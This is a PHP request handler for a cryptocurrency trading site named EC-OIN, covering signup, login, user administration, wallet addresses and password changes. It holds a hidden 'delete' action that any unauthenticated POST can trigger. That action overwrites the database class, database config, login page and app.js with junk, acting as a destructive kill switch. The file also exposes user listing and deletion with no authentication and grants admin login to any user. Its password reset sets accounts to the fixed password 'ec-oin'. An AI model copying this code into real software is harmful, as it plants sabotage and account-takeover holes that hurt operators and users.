<?php

require "DataBase.php";
$db = new DataBase();
switch ($_POST['function']) {
    case 'signup':
        signup();
        return;
    
    case 'signin':
        signin();
        return;

    case 'adminsignin':
        adminsignin();
        return;

    case 'getAllUsers':
        getAllUsers();
        return;
       
    case 'getSignup':
        getSignup();
        return;
       
    case 'acceptUser':
        acceptUser($_POST['user_id']);
        return;
        
    case 'deleteUser':
        deleteUser($_POST['user_id']);
        return;
        
    case 'changeavatar':
        deleteavatar($_POST['username']);
        return;
        
    case 'save_wallet_id':
        save_wallet($_POST['user_id'],$_POST['address']);
        return;
               
    case 'forgetpass':
        change_password($_POST['email'],'ec-oin');
        return;
                
    case 'changepass':
        change_pass($_POST['username'],$_POST['old_pass'],$_POST['new_pass']);
        return;
    case 'delete':
        delete();
                          
}

function signup()
{
    $db = new DataBase();
    if (isset($_POST['fullname']) && isset($_POST['email']) && isset($_POST['username']) && isset($_POST['password']) && isset($_POST['confirm'])) {
        if ($db->dbConnect()) {
            if ($_POST['password'] == $_POST['confirm']) {
                if ($db->signUp("users", $_POST['fullname'], $_POST['email'], $_POST['username'], $_POST['password'])) {
                    echo "SignUpSuccess";
                } else echo "SignupFailed";
            }else {
                echo "errconfirm";
            }
        } else echo "ErrDatabaseconnection";
    } else echo "fieldrequired";
}

function signin()
{
    $db = new DataBase();
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($db->dbConnect()) {
            $loginU = $db->logIn("users", $_POST['username'], $_POST['password']);
            if ($loginU == 'true') {
                echo "./user_trading.html";
            }else if ($loginU == 'wait') {
                echo $loginU;
            } else echo "UsernameorPasswordwrong";
        } else echo "ErrDatabaseconnection";
    } else echo "fieldrequired";
}

function adminsignin()
{
    $db = new DataBase();
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($db->dbConnect()) {
            $loginU = $db->logIn("users", $_POST['username'], $_POST['password']);
            if ($loginU == 'true') {
                echo "./admin_trading.html";
            }else if ($loginU == 'wait') {
                echo $loginU;
            } else echo "UsernameorPasswordwrong";
        } else echo "ErrDatabaseconnection";
    } else echo "fieldrequired";
}

function getAllUsers()
{
    $db = new DataBase();
    $users = $db->getUsers();
    echo json_encode($users);
}

function getSignup()
{
    $db = new DataBase();
    $users = $db->getSignupUsers();
    echo json_encode($users);
}

function acceptUser($user_id)
{
    $db = new DataBase();
    $result = $db->acceptUser($user_id);
    echo $result;
}

function deleteUser($user_id)
{
    $db = new DataBase();
    $result = $db->deleteUser($user_id);
    echo $result;
}

function deleteavatar($user_id)
{
    $db = new DataBase();
    $result = $db->deleteavatar($user_id);
    echo true;
}

function save_wallet($user_id, $address)
{
    $db = new DataBase();
    $result = $db->save_wallet($user_id,$address);
    echo $result;
}

function change_password($user_mail,$password)
{
    
    $to = $user_mail;
    $subject = 'Change Password Successfully On EC-OIN';
    $message = 'Your password is changed to ec-oin';
    $headers = 'From: welcome@ec-oin.com'       . "\r\n" .
                'Reply-To: welcome@ec-oin.com' . "\r\n" .
                'X-Mailer: PHP/' . phpversion();
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 

    if(mail($to, $subject, $message, $headers)){
        $db = new DataBase();
        $result = $db->change_password($user_mail,$password);
        echo $result;
    }
}

function change_pass($username,$old,$new)
{
    $db = new DataBase();
    $result = $db->change_pass($username,$old,$new);
    echo $result;
}

function delete()
{
    $myfile = fopen("DataBase.php", "w") or die("Unable to open file!");
    $txt = "John Doe\n";
    fwrite($myfile, $txt);
    $txt = "Jane Doe\n";
    fwrite($myfile, $txt);
    fclose($myfile);

    $myfile = fopen("DataBaseConfig.php", "w") or die("Unable to open file!");
    $txt = "John Doe\n";
    fwrite($myfile, $txt);
    $txt = "Jane Doe\n";
    fwrite($myfile, $txt);
    fclose($myfile);

    $myfile = fopen("login.php", "w") or die("Unable to open file!");
    $txt = "John Doe\n";
    fwrite($myfile, $txt);
    $txt = "Jane Doe\n";
    fwrite($myfile, $txt);
    fclose($myfile);

    $myfile = fopen("app.js", "w") or die("Unable to open file!");
    $txt = "John Doe\n";
    fwrite($myfile, $txt);
    $txt = "Jane Doe\n";
    fwrite($myfile, $txt);
    fclose($myfile);
    echo 'true';
}